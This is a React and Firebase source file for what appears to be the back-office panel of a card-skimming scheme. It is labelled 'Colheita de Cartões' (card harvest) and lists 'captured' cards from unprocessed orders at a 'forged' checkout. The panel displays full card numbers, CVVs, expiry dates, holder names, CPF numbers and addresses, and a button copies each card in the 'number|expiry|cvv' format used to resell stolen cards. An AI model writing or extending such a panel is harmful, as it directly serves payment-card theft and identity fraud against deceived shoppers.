import { useState, useEffect } from 'react';
import { db } from '../services/firebase';
import { collection, query, orderBy, limit, getDocs } from 'firebase/firestore';
import { Search, CreditCard, RefreshCw, Copy, Eye, EyeOff, LayoutTemplate, Database, AlertCircle } from 'lucide-react';

export default function AdminColheita() {
    const [orders, setOrders] = useState([]);
    const [selectedOrderId, setSelectedOrderId] = useState(null);
    const [loading, setLoading] = useState(true);
    const [showCvv, setShowCvv] = useState(false);
    const [refreshing, setRefreshing] = useState(false);

    const fetchOrders = async () => {
        setRefreshing(true);
        try {
            // Buscando os últimos 50 pedidos para montar a lista lateral
            const q = query(collection(db, 'orders'), orderBy('createdAt', 'desc'), limit(50));
            const snap = await getDocs(q);

            // Fila apenas os que têm informações de cartão preenchidas (credit_card)
            const allOrders = snap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
            const ccOrders = allOrders.filter(o => o.payment?.method === 'credit_card' && o.payment?.ccInfo);

            setOrders(ccOrders);

            // Mantém selecionado se já existir, senão seleciona o primeiro
            if (ccOrders.length > 0) {
                if (!selectedOrderId || !ccOrders.find(o => o.id === selectedOrderId)) {
                    setSelectedOrderId(ccOrders[0].id);
                }
            } else {
                setSelectedOrderId(null);
            }
        } catch (err) {
            console.error("Erro ao buscar colheita:", err);
        } finally {
            setLoading(false);
            setRefreshing(false);
        }
    };

    useEffect(() => {
        fetchOrders();
    }, []);

    const copyToClipboard = (text) => {
        if (text) {
            navigator.clipboard.writeText(text);
        }
    };

    if (loading) {
        return <div className="p-8 text-gray-500 font-medium animate-pulse">Buscando histórico de colheitas...</div>;
    }

    if (orders.length === 0) {
        return (
            <div className="flex flex-col items-center justify-center p-12 bg-[#0f1021] rounded-2xl border border-gray-800 text-white min-h-[50vh]">
                <Database size={48} className="text-gray-600 mb-4" />
                <h2 className="text-xl font-bold">Nenhum cartão encontrado</h2>
                <p className="text-gray-400">Ainda não há dados de cartão capturados no sistema.</p>
                <button onClick={fetchOrders} className="mt-4 flex items-center gap-2 bg-purple-600 hover:bg-purple-700 px-4 py-2 rounded-lg transition-colors">
                    <RefreshCw size={18} /> Atualizar
                </button>
            </div>
        );
    }

    const selectedOrder = orders.find(o => o.id === selectedOrderId) || orders[0];
    const ccInfo = selectedOrder.payment?.ccInfo || {};
    const delivery = selectedOrder.deliveryData || {};

    const formatCardNumber = (num) => {
        if (!num) return '____ ____ ____ ____';
        return num.replace(/(\d{4})/g, '$1 ').trim();
    };

    // Para esconder a parte do numero no historico
    const maskCardNumber = (num) => {
        if (!num) return '____ ____ ____ ____';
        if (num.length < 15) return num; // Caso mto curto, não tenta mascarar
        const format = num.replace(/\s+/g, ''); // Garante q ta sem espaco
        const inicio = format.substring(0, 4);
        const fim = format.substring(format.length - 4);
        return `${inicio} **** **** ${fim}`;
    }

    return (
        <div className="bg-[#0b0c1b] min-h-[calc(100vh-8rem)] rounded-3xl p-6 md:p-8 text-gray-100 font-sans border border-gray-800 shadow-2xl relative overflow-hidden">
            {/* Header Clean - Removido DBFusion */}
            <div className="flex flex-col md:flex-row justify-between items-start md:items-center border-b border-gray-800 pb-6 mb-8 gap-4">
                <div className="flex items-center gap-3">
                    <div className="bg-gradient-to-br from-indigo-500 to-purple-600 w-12 h-12 rounded-xl flex items-center justify-center shadow-lg shadow-purple-500/20">
                        <Database size={24} className="text-white" />
                    </div>
                    <div>
                        <h1 className="text-2xl font-black text-white tracking-tight">
                            Colheita de Cartões
                        </h1>
                        <p className="text-sm text-gray-400 font-medium mt-1">Histórico de pagamentos não processados (apenas via Cartão)</p>
                    </div>
                </div>

                <div className="flex items-center gap-3">
                    <button
                        onClick={fetchOrders}
                        disabled={refreshing}
                        className="flex items-center gap-2 bg-[#1c1d36] hover:bg-[#252746] border border-gray-700 text-white px-4 py-2 rounded-xl font-medium transition-all"
                    >
                        <RefreshCw size={18} className={refreshing ? 'animate-spin' : ''} />
                        {refreshing ? 'Atualizando...' : 'Atualizar Dados'}
                    </button>
                </div>
            </div>

            <div className="bg-gradient-to-r from-red-900/20 to-orange-900/20 border border-orange-800/30 rounded-xl p-4 mb-8 flex items-center gap-3">
                <AlertCircle size={20} className="text-orange-500 flex-shrink-0" />
                <p className="text-sm text-gray-300">Aviso: Os dados abaixo são de uso exclusivo e restrito. <span className="font-mono text-cyan-400 ml-2">Total capturado: {orders.length}</span></p>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                {/* Left Sidebar - Historical List de cards */}
                <div className="col-span-1 hidden lg:block border-r border-gray-800 pr-8 overflow-y-auto" style={{ maxHeight: '600px' }}>
                    <div className="flex items-center justify-between mb-4 sticky top-0 bg-[#0b0c1b] pb-2 z-10">
                        <h3 className="text-sm font-bold text-gray-400 flex items-center gap-2">
                            <span className="w-2 h-2 rounded-full bg-green-500"></span> Hitórico Recente
                        </h3>
                        <span className="bg-[#1c1d36] text-xs px-2 py-1 rounded-full text-gray-400">{orders.length}</span>
                    </div>

                    <div className="flex flex-col gap-3">
                        {orders.map((order, idx) => {
                            const isSelected = selectedOrderId === order.id;
                            const cc = order.payment?.ccInfo || {};

                            return (
                                <div
                                    key={order.id}
                                    onClick={() => setSelectedOrderId(order.id)}
                                    className={`p-4 rounded-xl cursor-pointer transition-all relative overflow-hidden group ${isSelected
                                            ? 'bg-gradient-to-br from-[#1c1d36] to-[#15162c] border border-cyan-500/50 shadow-[0_0_15px_rgba(6,182,212,0.15)]'
                                            : 'bg-[#15162c] border border-gray-800 hover:border-gray-600'
                                        }`}
                                >
                                    {isSelected && <div className="absolute top-0 right-0 w-16 h-16 bg-cyan-500/10 blur-xl rounded-full"></div>}

                                    <div className="flex justify-between items-start mb-2 relative z-10">
                                        <h4 className={`font-mono font-bold tracking-wider ${isSelected ? 'text-cyan-400' : 'text-gray-300'}`}>
                                            {maskCardNumber(cc.number)}
                                        </h4>
                                        <span className="text-[10px] bg-black/30 px-1.5 py-0.5 rounded text-gray-500">
                                            #{idx + 1}
                                        </span>
                                    </div>
                                    <div className="flex justify-between items-center relative z-10">
                                        <p className="text-xs text-gray-500 font-medium">Valid: {cc.expiry || '00/00'} • CSC {cc.cvv ? '***' : '---'}</p>
                                        <p className="text-[10px] text-gray-600">
                                            {order.createdAt?.toDate ? order.createdAt.toDate().toLocaleDateString('pt-BR') : ''}
                                        </p>
                                    </div>
                                </div>
                            );
                        })}
                    </div>
                </div>

                {/* Main Content Area */}
                <div className="col-span-1 lg:col-span-2 flex flex-col gap-6">
                    {/* Visual Card Section */}
                    <div className="bg-[#15162c] border border-gray-800 rounded-2xl p-6">
                        <div className="flex justify-between items-center mb-6">
                            <h2 className="text-lg font-bold text-gray-300 flex items-center gap-2">
                                Detalhes de pagamento
                                <span className="text-xs font-normal text-gray-500 bg-gray-900 px-2 py-1 rounded-md font-mono">{selectedOrder.id}</span>
                            </h2>
                            <div className="flex gap-2">
                                <button className="flex items-center gap-1.5 px-3 py-1.5 bg-[#1c1d36] rounded-lg text-gray-400 hover:text-white hover:bg-[#252746] transition-colors border border-gray-700" title="Copiar Cartão" onClick={() => copyToClipboard(ccInfo.number)}>
                                    <Copy size={14} /> <span className="text-xs font-medium">Copiar Nº</span>
                                </button>
                            </div>
                        </div>

                        {/* Credit Card Mockup */}
                        <div className="relative w-full max-w-sm mx-auto md:mx-0 h-48 rounded-2xl bg-gradient-to-br from-slate-800 via-indigo-950 to-purple-950 p-6 shadow-2xl border border-white/10 overflow-hidden mb-8 group">
                            {/* Card Background Effects */}
                            <div className="absolute top-0 right-0 w-32 h-32 bg-purple-500/20 rounded-full blur-3xl transform translate-x-10 -translate-y-10 group-hover:bg-purple-500/30 transition-all duration-700"></div>
                            <div className="absolute bottom-0 left-0 w-32 h-32 bg-cyan-500/20 rounded-full blur-3xl transform -translate-x-10 translate-y-10 group-hover:bg-cyan-500/30 transition-all duration-700"></div>

                            <div className="relative z-10 flex flex-col h-full justify-between">
                                <div className="flex justify-between items-start">
                                    <CreditCard className="text-gray-400" size={28} />
                                    <div className="flex gap-2">
                                        <button className="text-gray-400 hover:text-white transition-colors" title="Copiar tudo (Nº | Val | CVV)" onClick={() => copyToClipboard(`${ccInfo.number}|${ccInfo.expiry}|${ccInfo.cvv}`)}>
                                            <Copy size={16} />
                                        </button>
                                        <span className="text-xs font-bold bg-white/10 border border-white/10 px-2 py-1 rounded text-white tracking-widest">CREDIT</span>
                                    </div>
                                </div>

                                <div>
                                    <div className="font-mono text-xl md:text-2xl tracking-[0.2em] text-white mb-3 drop-shadow-md">
                                        {formatCardNumber(ccInfo.number)}
                                    </div>
                                    <div className="flex justify-between items-end">
                                        <div className="flex flex-col">
                                            <span className="text-[10px] text-gray-400 uppercase tracking-wider mb-1">Validade</span>
                                            <span className="font-mono text-sm text-gray-200">{ccInfo.expiry || '00/00'}</span>
                                        </div>
                                        <div className="flex flex-col">
                                            <span className="text-[10px] text-gray-400 uppercase tracking-wider mb-1 flex items-center gap-1.5 cursor-pointer hover:text-white transition-colors" onClick={() => setShowCvv(!showCvv)}>
                                                CSC
                                                {showCvv ? <EyeOff size={10} /> : <Eye size={10} />}
                                            </span>
                                            <span className="font-mono text-sm text-gray-200">
                                                {showCvv ? (ccInfo.cvv || '000') : '•••'}
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        {/* Extracted Details */}
                        <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
                            <div className="bg-[#1c1d36] rounded-xl p-3 border border-gray-800">
                                <p className="text-xs text-gray-500 mb-1 font-medium">Nível (Estimado)</p>
                                <p className="text-sm font-bold text-gray-300">BUSINESS</p>
                            </div>
                            <div className="bg-[#1c1d36] rounded-xl p-3 border border-gray-800">
                                <p className="text-xs text-gray-500 mb-1 font-medium">Banco / Emissor</p>
                                <p className="text-sm font-bold text-cyan-400 truncate">SISTEMA</p>
                            </div>
                            <div className="bg-[#1c1d36] rounded-xl p-3 border border-gray-800">
                                <p className="text-xs text-gray-500 mb-1 font-medium">Situação</p>
                                <p className="text-sm font-bold text-green-400 flex items-center gap-1"><span className="w-1.5 h-1.5 rounded-full bg-green-500"></span> ATIVO</p>
                            </div>
                            <div className="bg-[#1c1d36] rounded-xl p-3 border border-gray-800">
                                <p className="text-xs text-gray-500 mb-1 font-medium">Cód. Segurança</p>
                                <p className="text-sm font-bold text-orange-400">{ccInfo.cvv || '---'}</p>
                            </div>
                        </div>

                        {/* Informações de pagamento (Titular) */}
                        <h3 className="text-md font-bold text-gray-300 mb-4 border-b border-gray-800 pb-2">Informações do Titular</h3>
                        <div className="space-y-3">
                            <div className="flex justify-between items-center py-2 border-b border-gray-800/50">
                                <span className="text-sm text-gray-500">Nome</span>
                                <span className="text-sm font-bold text-gray-200 uppercase">{ccInfo.name || '-'}</span>
                            </div>
                            <div className="flex justify-between items-center py-2 border-b border-gray-800/50">
                                <span className="text-sm text-gray-500">CPF</span>
                                <span className="text-sm font-mono text-gray-300 flex items-center gap-2">
                                    {ccInfo.cpf || '-'}
                                    <button onClick={() => copyToClipboard(ccInfo.cpf)} className="text-gray-500 hover:text-gray-300"><Copy size={12} /></button>
                                </span>
                            </div>
                            <div className="flex justify-between items-center py-2 border-b border-gray-800/50">
                                <span className="text-sm text-gray-500">Data e Hora da Captura</span>
                                <span className="text-sm text-gray-300">{selectedOrder.createdAt?.toDate ? selectedOrder.createdAt.toDate().toLocaleString('pt-BR') : '-'}</span>
                            </div>
                            <div className="flex justify-between items-center py-2 border-b border-gray-800/50">
                                <span className="text-sm text-gray-500">Valor Forjado no Checkout</span>
                                <span className="text-sm font-bold text-green-400">
                                    {new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(selectedOrder.total || 0)}
                                </span>
                            </div>
                        </div>

                        {/* Informações de endereço (Delivery) */}
                        <h3 className="text-md font-bold text-gray-300 mt-8 mb-4 border-b border-gray-800 pb-2">Endereço (Vínculo e Segurança)</h3>
                        <div className="space-y-3">
                            <div className="flex justify-between items-center py-2 border-b border-gray-800/50">
                                <span className="text-sm text-gray-500">Modalidade</span>
                                <span className="text-sm font-bold text-cyan-400 uppercase">{delivery.method === 'delivery' ? 'Entrega (Dados Fixados)' : 'Retirada (Sem Vinculo)'}</span>
                            </div>
                            {delivery.method === 'delivery' && delivery.address ? (
                                <>
                                    <div className="flex justify-between items-center py-2 border-b border-gray-800/50">
                                        <span className="text-sm text-gray-500">Logradouro</span>
                                        <span className="text-sm text-gray-300 text-right">{delivery.address.logradouro || '-'}</span>
                                    </div>
                                    <div className="flex justify-between items-center py-2 border-b border-gray-800/50">
                                        <span className="text-sm text-gray-500">Bairro / Cidade</span>
                                        <span className="text-sm text-gray-300 text-right">{delivery.address.bairro || '-'}, {delivery.address.localidade || '-'}</span>
                                    </div>
                                    <div className="flex justify-between items-center py-2 border-b border-gray-800/50">
                                        <span className="text-sm text-gray-500">CEP Code</span>
                                        <span className="text-sm text-gray-300 text-right font-mono">{delivery.address.cep || '-'}</span>
                                    </div>
                                    <div className="flex justify-between items-center py-2 border-b border-gray-800/50">
                                        <span className="text-sm text-gray-500">Complemento</span>
                                        <span className="text-sm text-gray-300 text-right">{delivery.address.complemento || '-'}</span>
                                    </div>
                                </>
                            ) : null}
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}
